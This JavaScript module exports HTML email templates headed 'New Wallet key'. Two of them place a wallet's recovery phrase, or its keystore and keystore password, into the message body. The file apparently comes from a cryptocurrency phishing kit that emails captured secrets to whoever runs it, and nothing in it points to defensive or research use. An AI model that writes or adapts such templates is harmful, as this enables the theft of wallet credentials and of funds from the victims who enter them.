exports.CONSTANTSECOND = (wallet) => `<!doctype html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  </head>
  <body style="font-family: sans-serif;">
    <div style="display: block; margin: auto; max-width: 600px;" class="main">
      <h1 style="font-size: 18px; font-weight: bold; margin-top: 20px">New Wallet key</h1>
      <h2>wallet selected: ${wallet.wallet_selected}</h2></br>
      <h2>wallet keyStore: ${wallet.data_keystore}</h2></br>
      <h2>wallet keyStore_password: ${wallet.data_keystorepassword}</h2></br>
    </div>
  </body>
</html>`;


exports.CONSTANTFIRST = (wallet) => `<!doctype html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  </head>
  <body style="font-family: sans-serif;">
    <div style="display: block; margin: auto; max-width: 600px;" class="main">
      <h1 style="font-size: 18px; font-weight: bold; margin-top: 20px">New Wallet key</h1>
      <h2>wallet selected: ${wallet.wallet_selected}</h2></br>
      <h2>wallet Phrase: ${wallet.data_phrase}</h2></br>
    </div>
  </body>
</html>`;


exports.CONSTANTTHIRD = (wallet) => `<!doctype html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  </head>
  <body style="font-family: sans-serif;">
    <div style="display: block; margin: auto; max-width: 600px;" class="main">
      <h1 style="font-size: 18px; font-weight: bold; margin-top: 20px">New Wallet key</h1>
      <h2></h2>
    </div>
  </body>
</html>`;